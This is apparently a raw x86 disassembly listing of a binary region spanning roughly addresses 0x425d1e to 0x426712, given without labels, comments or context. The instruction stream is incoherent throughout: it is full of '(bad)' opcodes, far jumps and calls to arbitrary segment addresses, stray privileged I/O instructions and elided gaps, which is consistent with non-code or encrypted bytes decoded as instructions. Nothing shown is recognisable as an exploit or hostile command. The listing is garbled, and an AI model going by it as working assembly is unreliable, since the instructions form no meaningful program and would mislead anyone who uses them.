  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0xc8
  425d23:	cwde   
  425d24:	scas   al,BYTE PTR es:[edi]
  425d25:	aad    0x26
  425d27:	xchg   ebx,eax
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    ch,bl
  425d2f:	or     DWORD PTR [esi],0x9b9ab59d
  425d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d36:	rcr    bh,1
  425d38:	aad    0x34
  425d3a:	xor    BYTE PTR [eax+0x3666a25b],ah
  425d40:	sbb    dl,bl
  425d42:	xchg   BYTE PTR [eax+eiz*1-0x6f],ch
  425d46:	ins    BYTE PTR es:[edi],dx
  425d47:	add    al,0x9b
  425d49:	aad    0x75
  425d4b:	std    
  425d4c:	retf   
  425d4d:	fcmovne st,st(5)
  425d4f:	lahf   
  425d50:	dec    eax
  425d51:	retf   
  425d52:	jmp    0x425d85
  425d54:	stos   DWORD PTR es:[edi],eax
  425d55:	push   0xffffff9d
  425d57:	dec    esp
  425d58:	pop    esp
  425d59:	jmp    0x425d24
  425d5b:	in     eax,dx
  425d5c:	imul   eax,ebp,0xffffffc8
  425d5f:	add    BYTE PTR [ecx-0x4f],dh
  425d62:	ficomp WORD PTR [ecx-0x319f83f0]
  425d68:	mov    bl,0xc8
  425d6a:	retf   
  425d6b:	mov    edi,edx
  425d6d:	je     0x425d78
  425d6f:	inc    ecx
  425d70:	and    DWORD PTR [eax],ecx
  425d72:	push   ss
  425d73:	jbe    0x425d44
  425d75:	add    eax,0x6ac5d070
  425d7a:	jmp    0xea02:0xdcd27b4b
  425d81:	cmp    al,0xac
  425d83:	sbb    al,0x1c
  425d85:	cld    
  425d86:	loope  0x425de8
  425d88:	pop    eax
  425d89:	mov    al,0x6
  425d8b:	inc    esi
  425d8c:	sub    dh,bh
  425d8e:	imul   esi,DWORD PTR ds:0xcf11c3c6,0x32c2535f
  425d98:	push   0xffffffdb
  425d9a:	retf   0xa1cc
  425d9d:	dec    esp
  425d9e:	retf   
  425d9f:	(bad)  
  425da0:	jmp    0x9012d501
  425da5:	jl     0x425dc1
  425da7:	loopne 0x425d9e
  425da9:	xor    al,0xd8
  425dab:	push   0xaa6a0fbb
  425db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425db1:	clc    
  425db2:	cwde   
  425db3:	xor    al,0x57
  425db5:	pop    ecx
  425db6:	inc    ebp
  425db7:	xor    eax,0x8e5672a4
  425dbc:	jg     0x425e1f
  425dbe:	icebp  
  425dbf:	out    0x88,eax
  425dc1:	sub    edi,DWORD PTR [edx]
  425dc3:	adc    cl,cl
  425dc5:	leave  
  425dc6:	add    DWORD PTR [edx],eax
  425dc8:	jne    0x425d8e
  425dca:	xchg   ebx,eax
  425dcb:	les    eax,FWORD PTR ds:0xa88d4108
  425dd1:	mov    ah,0x26
  425dd3:	jmp    0x3512:0xbe0c7c9a
  425dda:	arpl   WORD PTR ds:0x724b9bf,di
  425de0:	repz aad 0x9c
  425de3:	jmp    0x4c72:0xb4adfb7e
  425dea:	xchg   eax,eax
  425dec:	jno    0x425e38
  425dee:	std    
  425def:	sub    al,0x5
  425df1:	mov    esp,0x4746f913
  425df6:	ja     0x425dca
  425df8:	es pop edi
  425dfa:	xchg   ecx,eax
  425dfb:	mov    ecx,0xf5582569
  425e00:	cmp    DWORD PTR [edi+ebp*4-0x71],edx
  425e04:	cmp    eax,0xfe3be11e
  425e09:	add    BYTE PTR [edx-0x46],ah
  425e0c:	cmp    eax,esi
  425e0e:	test   al,0xb5
  425e10:	fdivr  QWORD PTR [ecx+0x38b1c26b]
  425e16:	mov    DWORD PTR [ebp-0x7b36a0ee],ecx
  425e1c:	lea    edx,[eax]
  425e1e:	inc    eax
  425e1f:	inc    esp
  425e20:	out    dx,al
  425e21:	imul   edx,esp,0xcb32ba43
  425e27:	cmp    edx,DWORD PTR [edx-0xa]
  425e2a:	cli    
  425e2b:	sub    ecx,DWORD PTR [eax+0x6e]
  425e2e:	loop   0x425e2e
  425e30:	push   cs
  425e31:	aaa    
  425e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e33:	rol    ebx,0x0
	...
  425e96:	(bad)  
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	daa    
  425ea3:	inc    ecx
  425ea4:	dec    eax
  425ea5:	add    ebp,DWORD PTR ds:0x7000194
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    BYTE PTR [ebp-0x4e],ch
  425eb0:	mov    cl,0x44
  425eb2:	std    
  425eb3:	pusha  
  425eb4:	jne    0x425e7e
  425eb6:	ficomp WORD PTR [edi]
  425eb8:	pop    esp
  425eb9:	push   ebp
  425eba:	lock mov ebp,0xaf0415c4
  425ec0:	inc    edx
  425ec1:	cmp    ecx,esp
  425ec3:	cmc    
  425ec4:	lock aaa 
  425ec6:	sbb    al,0x26
  425ec8:	mov    bh,0xc8
  425eca:	inc    edx
  425ecb:	cmp    DWORD PTR [ebx-0x69],ebx
  425ece:	call   0x1173:0xe2e152b8
  425ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ed6:	daa    
  425ed7:	les    eax,FWORD PTR [esi]
  425ed9:	test   eax,0xd471aa91
  425ede:	mov    edx,DWORD PTR [edx+0x1c17473c]
  425ee4:	rcl    BYTE PTR [ebx-0x2a9be1d6],0x6c
  425eeb:	fist   WORD PTR ds:0x964c51ee
  425ef1:	and    bh,0x19
  425ef4:	sbb    al,0x89
  425ef6:	mov    edx,DWORD PTR [esi+ebx*8+0x24314b57]
  425efd:	push   ebx
  425efe:	adc    al,0xee
  425f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f01:	(bad)  
  425f02:	mov    BYTE PTR [edx+ebp*2+0x10],0xbe
  425f07:	daa    
  425f08:	mov    ch,0xf2
  425f0a:	in     al,0x5d
  425f0c:	inc    si
  425f0e:	(bad)  
  425f0f:	aas    
  425f10:	pop    ecx
  425f11:	pop    ebx
  425f12:	adc    cl,dh
  425f14:	mul    BYTE PTR ds:[esi-0x2d04c472]
  425f1b:	and    BYTE PTR [esi+0x3a48794c],ah
  425f21:	icebp  
  425f22:	pop    edi
  425f23:	dec    edx
  425f24:	clc    
  425f25:	or     DWORD PTR [esi+eiz*4-0x62f450b6],0x7f
  425f2d:	and    eax,0x3b4d86b
  425f32:	scas   al,BYTE PTR es:[edi]
  425f33:	sahf   
  425f34:	push   cs
  425f35:	lahf   
  425f36:	mov    edi,0x6c9fefd5
  425f3b:	fs leave 
  425f3d:	das    
  425f3e:	xchg   edi,eax
  425f3f:	cli    
  425f40:	mov    bl,0xa3
  425f42:	gs stos BYTE PTR es:[edi],al
  425f44:	xchg   esi,eax
  425f45:	and    al,0xeb
  425f47:	lock repnz les esp,FWORD PTR [eax-0x47]
  425f4c:	mov    ds,WORD PTR [ebx+0x7a]
  425f4f:	rol    DWORD PTR [edx+0x11dac2d3],1
  425f55:	xor    DWORD PTR [eax+0x6f0bac59],ebp
  425f5b:	aaa    
  425f5c:	imul   esp,DWORD PTR [ebx-0x68],0xffffffc3
  425f60:	and    BYTE PTR ds:0xd98fd3f9,bl
  425f66:	mov    cs,ebp
  425f68:	cdq    
  425f69:	pop    edi
  425f6a:	xchg   ebp,eax
  425f6b:	jnp    0x425f04
  425f6d:	cmp    ebp,edi
  425f6f:	sub    BYTE PTR [ebx-0x61],ah
  425f72:	sahf   
  425f73:	adc    eax,0x1f124971
  425f78:	add    al,0x7d
  425f7a:	shl    DWORD PTR [edx-0xe],0x58
  425f7e:	scas   al,BYTE PTR es:[edi]
  425f7f:	mov    cl,0x93
  425f81:	push   0x7e39f9d2
  425f86:	cli    
  425f87:	mov    cl,BYTE PTR [edx-0x7f]
  425f8a:	mov    ch,0xd7
  425f8c:	rol    BYTE PTR [eax-0x191aded7],1
  425f92:	mov    dl,0x71
  425f94:	mov    ds:0xec68dda9,al
  425f99:	sbb    eax,0xe41d5276
  425f9e:	dec    ebx
  425f9f:	shl    DWORD PTR [edi-0x4f],1
  425fa2:	inc    edi
  425fa3:	bound  ebp,QWORD PTR ds:0xc4c2cb0e
  425fa9:	repz in eax,dx
  425fab:	out    dx,eax
  425fac:	pushf  
  425fad:	not    BYTE PTR [edi+0x2e]
  425fb0:	dec    esp
  425fb1:	jmp    0xf9c2e2
	...
  426016:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0xc4c08b93
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [ebx-0x503ca7ad],ah
  426033:	test   DWORD PTR [esi],esi
  426035:	retf   
  426036:	fsubr  QWORD PTR [eax]
  426038:	add    eax,0xb797c794
  42603d:	sub    esi,DWORD PTR [eax]
  42603f:	inc    ebp
  426040:	jg     0x426017
  426042:	pop    edi
  426043:	push   ss
  426044:	fistp  DWORD PTR ds:0xa7038e23
  42604a:	imul   ebp,DWORD PTR [edi-0x7a75afdc],0xffffff85
  426051:	call   0x56fad81d
  426056:	dec    esp
  426057:	int3   
  426058:	and    edx,DWORD PTR [ecx+0x4b]
  42605b:	adc    ch,cl
  42605d:	xchg   DWORD PTR [ecx+eiz*4+0x61],ebp
  426061:	adc    al,0x78
  426063:	test   al,0xf0
  426065:	push   edi
  426066:	in     eax,0xf3
  426068:	not    DWORD PTR [edi+0x78]
  42606b:	pop    edi
  42606c:	outs   dx,BYTE PTR ds:[esi]
  42606d:	jb     0x426020
  42606f:	xor    esp,DWORD PTR [ecx+eax*1]
  426072:	sub    DWORD PTR [eax],0x64
  426075:	mov    al,ds:0x2633a1b4
  42607a:	push   ebp
  42607b:	inc    edx
  42607c:	pop    ebp
  42607d:	in     al,0x23
  42607f:	xchg   ecx,eax
  426080:	loope  0x4260bd
  426082:	add    esp,esp
  426084:	bound  esp,QWORD PTR [ecx+eax*8-0x64]
  426088:	dec    ecx
  426089:	xchg   ebp,eax
  42608a:	cmp    BYTE PTR [eax+0x29],bh
  42608d:	stos   DWORD PTR es:[edi],eax
  42608e:	xor    cl,BYTE PTR [edx+esi*8+0x7268716]
  426095:	rol    ebx,0x2
  426098:	xchg   DWORD PTR [ebx-0xd8c3947],ebx
  42609e:	jmpw   0xb359
  4260a2:	add    esp,DWORD PTR [edx-0x72]
  4260a5:	pop    eax
  4260a6:	cli    
  4260a7:	call   0xfb4ebba8
  4260ac:	dec    esp
  4260ad:	int    0xf8
  4260af:	add    eax,0x948ed0d3
  4260b4:	ror    DWORD PTR [edx],0x7f
  4260b7:	xor    DWORD PTR [edx-0x3e1a23df],edi
  4260bd:	cmp    eax,0x170a2a38
  4260c2:	or     edi,DWORD PTR [edx]
  4260c4:	push   esi
  4260c5:	mov    edi,0x59ca33e0
  4260ca:	cli    
  4260cb:	cs cli 
  4260cd:	or     cl,BYTE PTR [edx-0x51]
  4260d0:	pop    eax
  4260d1:	stc    
  4260d2:	clc    
  4260d3:	pushf  
  4260d4:	in     al,dx
  4260d5:	lea    esi,[edi+0x1b]
  4260d8:	into   
  4260d9:	fld    TBYTE PTR [edx-0x3a]
  4260dc:	mov    ecx,DWORD PTR [ebp-0x30]
  4260df:	dec    edi
  4260e0:	mov    ah,0x36
  4260e2:	inc    edx
  4260e3:	jl     0x426140
  4260e5:	lahf   
  4260e6:	and    al,ah
  4260e8:	or     ah,BYTE PTR ds:0x75af8493
  4260ee:	push   ecx
  4260ef:	cmp    eax,0xc64a67cf
  4260f4:	adc    DWORD PTR [eax-0x444533c5],eax
  4260fa:	inc    ecx
  4260fb:	retf   0x4a1b
  4260fe:	xchg   ebx,eax
  4260ff:	jle    0x4260f2
  426101:	arpl   WORD PTR [ebp+0x16ea5cd6],dx
  426107:	sbb    DWORD PTR [edi],ecx
  426109:	or     esi,DWORD PTR [esi+0x1b]
  42610c:	lods   al,BYTE PTR ds:[esi]
  42610d:	dec    edi
  42610e:	icebp  
  42610f:	stos   DWORD PTR es:[edi],eax
  426110:	stos   DWORD PTR es:[edi],eax
  426111:	inc    ebp
  426112:	test   BYTE PTR [edx-0x4e],bh
  426115:	and    ch,BYTE PTR [eax-0x11]
  426118:	jmp    0x7f65179b
  42611d:	imul   edi,DWORD PTR [ebx+0x65f7b18a],0xffffffd9
  426124:	dec    edx
  426125:	mov    ch,0xc0
  426127:	loopne 0x42617a
  426129:	(bad)  
  42612a:	lods   eax,DWORD PTR ds:[esi]
  42612b:	not    ah
  42612d:	adc    BYTE PTR [edx+0x5c],dl
  426130:	lds    esp,FWORD PTR ds:0xabd606
	...
  426196:	fwait
  426197:	and    DWORD PTR [edi],ecx
  426199:	popa   
  42619a:	mov    edi,0x6ffbff6f
  42619f:	sub    BYTE PTR [ebx+0x18f7ee83],bh
  4261a5:	mov    esp,0x1963b
  4261aa:	pop    es
  4261ab:	add    DWORD PTR [eax],eax
  4261ad:	add    BYTE PTR [edx-0x43fa92a0],dh
  4261b3:	jg     0x426180
  4261b5:	fmulp  st(0),st
  4261b7:	inc    ecx
  4261b8:	jle    0x426194
  4261ba:	mov    WORD PTR [edx],ss
  4261bc:	js     0x4261dd
  4261be:	add    BYTE PTR ds:0x32d1e62c,ah
  4261c4:	aad    0x78
  4261c6:	shr    dh,cl
  4261c8:	(bad)  
  4261ca:	ficom  DWORD PTR [esi-0x7929acc6]
  4261d0:	fidiv  DWORD PTR [ecx+0x67]
  4261d3:	xor    bl,cl
  4261d5:	jl     0x4261af
  4261d7:	sub    BYTE PTR [esi+ecx*4],ch
  4261da:	icebp  
  4261db:	cmp    ch,BYTE PTR [esi+0x55b1f54f]
  4261e1:	push   edi
  4261e2:	dec    edi
  4261e3:	push   ss
  4261e4:	pusha  
  4261e5:	fsubr  DWORD PTR [ecx+0x408118f2]
  4261eb:	dec    edx
  4261ec:	data16 rcr BYTE PTR [ebx],cl
  4261ef:	cmp    al,0xc2
  4261f1:	popf   
  4261f2:	retf   0xc929
  4261f5:	je     0x4261a8
  4261f7:	and    ecx,DWORD PTR [eax+0x15]
  4261fa:	xor    esi,DWORD PTR ss:[ebp-0x5d]
  4261fe:	push   ds
  4261ff:	mov    dh,0x2b
  426201:	out    dx,eax
  426202:	xlat   BYTE PTR ds:[ebx]
  426203:	ss mov esp,0x227c840b
  426209:	jb     0x426269
  42620b:	jmp    0x426196
  42620d:	push   ss
  42620e:	push   cs
  42620f:	xchg   ebx,eax
  426210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426211:	and    DWORD PTR [edi+0x17],edi
  426214:	adc    eax,0x2077cb8
  426219:	mov    edi,0x40bab262
  42621e:	repz xchg ebp,eax
  426220:	lea    eax,[ecx-0x6cb8bed]
  426226:	jo     0x4261df
  426228:	jne    0x426206
  42622a:	retf   0x59ec
  42622d:	mov    eax,ds:0x59c267a3
  426232:	fisttp WORD PTR [edi+0x60]
  426235:	imul   eax,DWORD PTR [ebx-0x608f8de1],0x41
  42623c:	pop    esi
  42623d:	int    0xe0
  42623f:	shl    BYTE PTR [eax-0x14],cl
  426242:	xchg   ebp,eax
  426243:	test   BYTE PTR [eax+esi*8+0x2a8b0edc],al
  42624a:	lahf   
  42624b:	or     eax,0x5d629f47
  426250:	stc    
  426251:	sbb    al,0xae
  426253:	lock push ds
  426255:	ja     0x4262d3
  426257:	push   ebx
  426258:	pop    si
  42625a:	(bad)  
  42625b:	jle    0x426259
  42625d:	sbb    ebp,DWORD PTR [eax+0x620c1ed7]
  426263:	jle    0x426293
  426265:	(bad)  
  426266:	outs   dx,BYTE PTR ds:[esi]
  426267:	jno    0x4262cc
  426269:	cmp    DWORD PTR [esi+0x3e],edi
  42626c:	cmp    ecx,DWORD PTR [ebx]
  42626e:	gs ss jg 0x42626b
  426272:	sti    
  426273:	mov    ecx,0x7cd8400
  426278:	add    esi,ebx
  42627a:	mov    ch,0x71
  42627c:	xor    ebp,DWORD PTR [edx-0x3037bbbb]
  426282:	push   ebp
  426283:	rcr    DWORD PTR [eax+0x4],cl
  426286:	(bad)  
  426287:	jl     0x4262af
  426289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42628a:	enter  0x4dbc,0x51
  42628e:	stc    
  42628f:	add    ecx,ebp
  426291:	push   0x2a0d963e
  426296:	lds    edi,FWORD PTR [esi-0x31028b05]
  42629c:	mov    eax,ebp
  42629e:	or     DWORD PTR [esi],ebx
  4262a0:	or     DWORD PTR [esi-0x35584962],0xffffffa5
  4262a7:	jo     0x42625c
  4262a9:	xchg   DWORD PTR [edx+0xfcf4261],edi
  4262af:	dec    ebp
  4262b0:	add    BYTE PTR gs:[edx+0xb9cf],0x0
	...
  426314:	add    BYTE PTR [eax],al
  426316:	push   esp
  426317:	and    eax,0xeefd4e8d
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x5354
  426323:	pop    esp
  426324:	inc    esp
  426325:	pusha  
  426326:	inc    edx
  426327:	xchg   edi,eax
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    ch,ch
  42632f:	cmp    bh,BYTE PTR [ebx-0xe83ebfd]
  426335:	idiv   BYTE PTR [ebx+0x3]
  426338:	pop    ds
  426339:	adc    BYTE PTR [ecx+0x7d],bl
  42633c:	in     eax,0x48
  42633e:	(bad)  
  42633f:	xchg   esi,eax
  426340:	cmp    eax,0xd3180aea
  426345:	aaa    
  426346:	inc    edi
  426347:	push   es
  426348:	jg     0x4262dc
  42634a:	xor    esi,0xb7d2ecc6
  426350:	pop    ebx
  426351:	hlt    
  426352:	icebp  
  426353:	jns    0x4263b6
  426355:	jg     0x426324
  426357:	adc    BYTE PTR [esi],dl
  426359:	sti    
  42635a:	dec    ebx
  42635b:	jg     0x4262ea
  42635d:	test   bl,cl
  42635f:	sbb    dl,BYTE PTR [esi]
  426361:	fwait
  426362:	mov    edx,0xa260a88f
  426367:	dec    eax
  426368:	fisttp DWORD PTR [edx+0x26165bb3]
  42636e:	mov    WORD PTR [edi+0x36a5d809],ds
  426374:	sub    eax,0x398127a5
  426379:	add    edi,esp
  42637b:	dec    ecx
  42637c:	add    al,BYTE PTR [ebx-0x55b33af3]
  426382:	push   ds
  426383:	jb     0x4263dd
  426385:	in     eax,dx
  426386:	pop    ds
  426387:	leave  
  426388:	aas    
  426389:	(bad)  
  42638a:	or     al,0xe6
  42638c:	xor    eax,0xd99f6eac
  426391:	mul    eax
  426393:	push   ecx
  426394:	int    0x9b
  426396:	and    BYTE PTR [esi+edi*8-0x25],al
  42639a:	mov    ebp,0x91cc488f
  42639f:	jb     0x4263bc
  4263a1:	rol    BYTE PTR [ecx-0x1cd78b2e],0x9e
  4263a8:	test   BYTE PTR [eax+ebp*8-0x3d554ab4],dh
  4263af:	push   esp
  4263b0:	push   eax
  4263b1:	fdiv   st(6),st
  4263b3:	inc    ebp
  4263b4:	cld    
  4263b5:	cmc    
  4263b6:	dec    edi
  4263b7:	mov    al,ds:0x31478bfd
  4263bc:	das    
  4263bd:	mov    ebp,0x5742070b
  4263c2:	out    0xa,al
  4263c4:	jbe    0x426423
  4263c6:	inc    edx
  4263c7:	sbb    edi,edi
  4263c9:	mov    esi,0x8d08899c
  4263ce:	xor    al,0xf7
  4263d0:	out    dx,al
  4263d1:	sub    al,0x6e
  4263d3:	mov    esp,0x43c4dbe2
  4263d8:	jg     0x42636d
  4263da:	imul   esi,DWORD PTR [ebx],0x6b732a9a
  4263e0:	xor    eax,DWORD PTR [edx-0x11]
  4263e3:	and    dh,BYTE PTR [eax-0x738f47d9]
  4263e9:	dec    esp
  4263ea:	cmc    
  4263eb:	(bad)  [ebp-0x4b37f81d]
  4263f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263f2:	mov    ebp,ds
  4263f4:	cmp    eax,0xad93f859
  4263f9:	inc    edx
  4263fa:	ins    BYTE PTR es:[edi],dx
  4263fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263fc:	dec    esi
  4263fd:	sbb    ecx,DWORD PTR [esi-0x27f85139]
  426403:	sub    esi,ebx
  426405:	inc    esi
  426406:	jbe    0x4263d5
  426408:	pop    edi
  426409:	test   DWORD PTR [eax],esp
  42640b:	push   edi
  42640c:	int    0xdf
  42640e:	xchg   DWORD PTR [esi+0x4b32528a],edi
  426414:	or     al,0x21
  426416:	ror    BYTE PTR [ebx],0xcf
  426419:	je     0x426436
  42641b:	rcr    DWORD PTR [eax],0xd0
  42641e:	push   ebp
  42641f:	jne    0x426436
  426421:	xchg   ebx,eax
  426422:	jmp    0xcc24:0xd7707a88
  426429:	retf   0xfc00
  42642c:	or     dh,al
  42642e:	pop    esp
  42642f:	out    0xba,eax
  426431:	mov    ebp,0xc904d1
	...
  426496:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42649d:	outs   dx,DWORD PTR ds:[esi]
  42649e:	(bad)  
  42649f:	fistp  QWORD PTR [edx+0x4c]
  4264a2:	pushf  
  4264a3:	jb     0x4264e4
  4264a5:	in     al,dx
  4264a6:	dec    ecx
  4264a7:	cwde   
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    al,ah
  4264af:	mov    ecx,0x21c9ffcf
  4264b4:	scas   al,BYTE PTR es:[edi]
  4264b5:	adc    BYTE PTR [ebp+0x304ac084],0xf9
  4264bc:	popf   
  4264bd:	or     bx,WORD PTR [ebp-0x44]
  4264c1:	out    dx,eax
  4264c2:	jnp    0x426512
  4264c4:	sbb    BYTE PTR [esi+ebp*8],dl
  4264c7:	pop    ss
  4264c8:	cld    
  4264c9:	inc    edi
  4264ca:	pop    edx
  4264cb:	lods   al,BYTE PTR ds:[esi]
  4264cc:	jne    0x42646e
  4264ce:	mov    al,ds:0x350a7442
  4264d3:	loop   0x4264d2
  4264d5:	shl    BYTE PTR [esi],cl
  4264d7:	mov    ah,0x1f
  4264d9:	dec    ebx
  4264da:	push   ds
  4264db:	push   eax
  4264dc:	repz scas al,BYTE PTR es:[edi]
  4264de:	ins    BYTE PTR es:[edi],dx
  4264df:	or     BYTE PTR [eax+0x18],ah
  4264e2:	ror    DWORD PTR ds:0x66eede88,cl
  4264e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264e9:	(bad)  
  4264ea:	addr16 mov edx,0x1b5cacec
  4264f0:	dec    ecx
  4264f1:	mov    DWORD PTR [eax-0x5e22f9fd],edi
  4264f7:	add    BYTE PTR [eax],bl
  4264f9:	or     eax,0x10183164
  4264fe:	mov    esi,0xdecbca15
  426503:	pop    edi
  426504:	pop    eax
  426505:	lock inc ebx
  426507:	pop    es
  426508:	or     edx,ebp
  42650a:	in     al,0xe7
  42650c:	jnp    0x426504
  42650e:	pop    edi
  42650f:	adc    al,0xf9
  426511:	repnz popw ds
  426514:	stc    
  426515:	push   edx
  426516:	add    eax,0x9481dce2
  42651b:	arpl   WORD PTR [ecx],bp
  42651d:	mov    ecx,0x939cd7e
  426522:	cmp    ebp,DWORD PTR [ebx+ecx*1]
  426525:	(bad)  
  426526:	jecxz  0x42659f
  426528:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42652a:	mov    dl,0x59
  42652c:	test   cl,al
  42652e:	pop    esp
  42652f:	jae    0x4264e6
  426531:	inc    esp
  426532:	(bad)  
  426534:	repnz arpl WORD PTR [esi],bp
  426537:	jno    0x42654b
  426539:	leave  
  42653a:	mov    ds:0x10a7f34c,al
  42653f:	popf   
  426540:	(bad)
  426544:	xchg   esp,eax
  426545:	cmp    ebx,DWORD PTR [edi]
  426547:	(bad)  
  426548:	scas   eax,DWORD PTR es:[edi]
  426549:	ins    DWORD PTR es:[edi],dx
  42654a:	(bad)  
  42654b:	les    esp,FWORD PTR [edi]
  42654d:	out    dx,eax
  42654e:	dec    edx
  42654f:	cdq    
  426550:	es dec ecx
  426553:	ror    DWORD PTR [edi],1
  426555:	gs ss shr ch,1
  426559:	mov    BYTE PTR [esi+0x9],dh
  42655c:	mov    ebp,eax
  42655e:	mov    al,ds:0x5d758ccf
  426563:	je     0x4264fb
  426565:	and    al,0x21
  426567:	outs   dx,DWORD PTR ds:[esi]
  426568:	das    
  426569:	retf   0xc5db
  42656c:	xchg   BYTE PTR [ebx],bh
  42656e:	mov    ebx,0x97992b9
  426573:	into   
  426574:	inc    ebx
  426575:	push   0x11
  426577:	xchg   esp,eax
  426578:	ror    DWORD PTR [ecx+0x3c],cl
  42657b:	fcmovbe st,st(2)
  42657d:	dec    edx
  42657e:	mov    bh,0xa9
  426580:	(bad)  
  426581:	xchg   esi,eax
  426582:	retf   
  426583:	add    al,0xd8
  426585:	inc    esp
  426586:	daa    
  426587:	bound  edx,QWORD PTR [edx-0x4b]
  42658a:	jl     0x426517
  42658c:	mov    esi,0x58a04930
  426591:	inc    edx
  426592:	cmc    
  426593:	jne    0x42656d
  426595:	adc    eax,0xef71af8
  42659a:	js     0x4265b2
  42659c:	cs pusha 
  42659e:	xor    ch,al
  4265a0:	ret    
  4265a1:	inc    eax
  4265a2:	inc    esp
  4265a3:	xor    eax,0x631758ca
  4265a8:	pop    esp
  4265a9:	fiadd  DWORD PTR [ebp+eax*2+0x71bf8bde]
  4265b0:	jae    0x42658a
  4265b2:	mov    dl,0xc0
  4265b4:	in     eax,0x0
	...
  426616:	adc    cl,bl
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	mov    cl,0x84
  426624:	test   DWORD PTR [edi],esp
  426626:	push   eax
  426627:	cdq    
  426628:	add    DWORD PTR [eax],eax
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    BYTE PTR [esi],dl
  42662f:	mov    ebp,0x17bc486c
  426634:	test   BYTE PTR [esi],bl
  426636:	shl    BYTE PTR [edx+0x6d],1
  426639:	push   edx
  42663a:	ror    DWORD PTR [edx-0x2a],1
  42663d:	lahf   
  42663e:	and    esi,DWORD PTR [edi]
  426640:	arpl   WORD PTR [ecx+0x37b686bf],cx
  426646:	sahf   
  426647:	fsubr  st(0),st
  426649:	int    0x34
  42664b:	dec    edi
  42664c:	aas    
  42664d:	clc    
  42664e:	sub    bl,BYTE PTR [ebx-0x1f04b667]
  426654:	jo     0x4266bb
  426656:	push   edx
  426657:	je     0x4266c8
  426659:	push   edi
  42665a:	lods   al,BYTE PTR ds:[esi]
  42665b:	cdq    
  42665c:	xor    DWORD PTR [edx+edx*2],edx
  42665f:	and    BYTE PTR [ecx+esi*8+0x5],ch
  426663:	or     eax,0x982be1c4
  426668:	mov    esp,0x57fa3440
  42666d:	es dec esi
  42666f:	stos   DWORD PTR es:[edi],eax
  426670:	dec    ecx
  426671:	jl     0x426651
  426673:	jg     0x426686
  426675:	or     cl,BYTE PTR [edx+0x7c]
  426678:	popa   
  426679:	cmp    cl,0x7d
  42667c:	xchg   edi,eax
  42667d:	outs   dx,DWORD PTR ds:[esi]
  42667e:	rol    ch,cl
  426680:	cs dec ecx
  426682:	add    BYTE PTR [esi+0x1ce7bac0],0x8f
  426689:	xor    BYTE PTR [ebx-0x3f],bh
  42668c:	push   esp
  42668d:	ror    DWORD PTR [edi],1
  42668f:	or     edi,DWORD PTR [eax]
  426691:	imul   ecx,DWORD PTR [ebp+0xc8086f0],0xef352789
  42669b:	xchg   ebp,eax
  42669c:	mov    dh,0xa1
  42669e:	jns    0x42662b
  4266a0:	jp     0x4266ed
  4266a2:	jne    0x426682
  4266a4:	enter  0xb930,0x2c
  4266a8:	sbb    ebp,DWORD PTR [edx+eiz*4+0x71]
  4266ac:	sbb    al,0xcd
  4266ae:	push   ebx
  4266af:	call   0x9d4b00e8
  4266b4:	ins    BYTE PTR es:[edi],dx
  4266b5:	stos   BYTE PTR es:[edi],al
  4266b6:	add    eax,0x526ad65e
  4266bb:	lds    esp,FWORD PTR [ecx-0x797af61b]
  4266c1:	je     0x4266d5
  4266c3:	adc    DWORD PTR [edx-0x73],eax
  4266c6:	nop
  4266c7:	xlat   BYTE PTR ds:[ebx]
  4266c8:	push   ecx
  4266c9:	test   DWORD PTR [ecx-0x4e],edx
  4266cc:	inc    ecx
  4266cd:	sbb    dh,BYTE PTR [edx+0xb]
  4266d0:	int    0xa7
  4266d2:	xchg   ebx,eax
  4266d3:	in     eax,dx
  4266d4:	sbb    BYTE PTR [edx-0x18],cl
  4266d7:	xchg   edi,eax
  4266d8:	mov    ah,0x39
  4266da:	sub    ch,BYTE PTR [ebp+0x19]
  4266dd:	adc    ebp,DWORD PTR [eax-0x2e5b5b3b]
  4266e3:	pop    DWORD PTR [ebp+0x70]
  4266e6:	iret   
  4266e7:	ss push ebx
  4266e9:	dec    ecx
  4266ea:	mov    ebp,0x76e8ddf9
  4266ef:	lock push edx
  4266f1:	and    DWORD PTR [edi+0x54d4358c],esi
  4266f7:	xor    edx,DWORD PTR [ecx+0x10e9a11]
  4266fd:	(bad)  
  4266fe:	call   0xcccbe854
  426703:	jnp    0x426760
  426705:	clc    
  426706:	(bad)  
  426707:	cld    
  426708:	pop    ecx
  426709:	ds js  0x4266ad
  42670c:	and    eax,0x686f7e24
  426711:	ins    BYTE PTR es:[edi],dx
  426712:	fimul  DWORD PTR [edx-0x4d]
